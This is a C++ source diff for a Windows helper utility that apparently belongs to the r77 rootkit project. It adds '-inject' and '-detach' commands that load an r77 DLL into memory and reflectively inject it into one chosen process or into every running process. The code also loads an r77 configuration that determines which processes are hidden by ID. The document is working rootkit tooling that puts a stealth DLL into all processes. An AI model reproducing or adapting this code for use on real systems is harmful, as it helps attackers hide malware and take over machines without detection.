@@ -1,14 +1,59 @@
-#include "ProcessList.h"
+#include "Helper.h"
 
-// ProcessList32.exe and ProcessList64.exe are used by TestConsole.exe to retrieve a process list.
-// Some of the code only works, if the bitness of the process matches that of the enumerated process.
-// Therefore, two executables are required.
-// TestConsole.exe reads the console output to display a process list.
-
-int main(int argc, char *argv[])
+int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
 {
 	InitializeApi(INITIALIZE_API_SRAND | INITIALIZE_API_DEBUG_PRIVILEGE);
 
+	int argCount;
+	LPWSTR *args = CommandLineToArgvW(GetCommandLineW(), &argCount);
+	if (!args) return 1;
+
+	if (argCount == 1)
+	{
+		MessageBoxW(NULL, L"This is a commandline utility used by TestConsole.exe", sizeof(LPVOID) == 4 ? L"Helper32.exe" : L"Helper64.exe", MB_ICONASTERISK | MB_OK);
+		return 1;
+	}
+	// Helper32|64.exe -list
+	else if (argCount == 2 && !lstrcmpiW(args[1], L"-list"))
+	{
+		return ProcessList();
+	}
+	// All processes: Helper32|64.exe -inject -all "C:\path\to\r77-*.dll"
+	// Specific PID:  Helper32|64.exe -inject 1234 "C:\path\to\r77-*.dll"
+	else if (argCount == 4 && !lstrcmpiW(args[1], L"-inject"))
+	{
+		if (!lstrcmpiW(args[2], L"-all"))
+		{
+			return Inject(-1, args[3]);
+		}
+		else
+		{
+			DWORD processId = _wtol(args[2]);
+			return processId == 0 ? 1 : Inject(processId, args[3]);
+		}
+	}
+	// All processes: Helper32|64.exe -detach -all
+	// Specific PID:  Helper32|64.exe -detach 1234
+	else if (argCount == 3 && !lstrcmpiW(args[1], L"-detach"))
+	{
+		if (!lstrcmpiW(args[2], L"-all"))
+		{
+			return Detach(-1);
+		}
+		else
+		{
+			DWORD processId = _wtol(args[2]);
+			return processId == 0 ? 1 : Detach(processId);
+		}
+	}
+	else
+	{
+		return 1;
+	}
+}
+
+int ProcessList()
+{
 	// Get r77 configuration to determine which processes are hidden by ID.
 	PR77_CONFIG r77Config = LoadR77Config();
 
@@ -103,4 +148,54 @@ int main(int argc, char *argv[])
 	CloseHandle(snapshot);
 
 	return 0;
+}
+int Inject(DWORD processId, LPCWSTR dllPath)
+{
+	// Read r77-x86.dll or r77-x64.dll into memory for reflective DLL injection.
+	// When r77 is deployed, the DLL does not need to be on the disk; It is injected directly from memory into the remote process.
+
+	LPBYTE dll;
+	DWORD dllSize;
+	if (!ReadFileContent(dllPath, &dll, &dllSize)) return 1;
+
+	if (processId == -1)
+	{
+		// Inject all processes
+		LPDWORD processes = new DWORD[10000];
+		DWORD processCount = 0;
+		if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
+		{
+			processCount /= sizeof(DWORD);
+
+			for (DWORD i = 0; i < processCount; i++)
+			{
+				InjectDll(processes[i], dll, dllSize, TRUE);
+			}
+
+			return 0;
+		}
+		else
+		{
+			return 1;
+		}
+	}
+	else
+	{
+		// Inject specific process
+		return InjectDll(processId, dll, dllSize, FALSE) ? 0 : 1;
+	}
+}
+int Detach(DWORD processId)
+{
+	if (processId == -1)
+	{
+		// Detach from all processes
+		DetachAllInjectedProcesses();
+		return 0;
+	}
+	else
+	{
+		// Detach from specific process
+		return DetachInjectedProcess(processId) ? 0 : 1;
+	}
 }
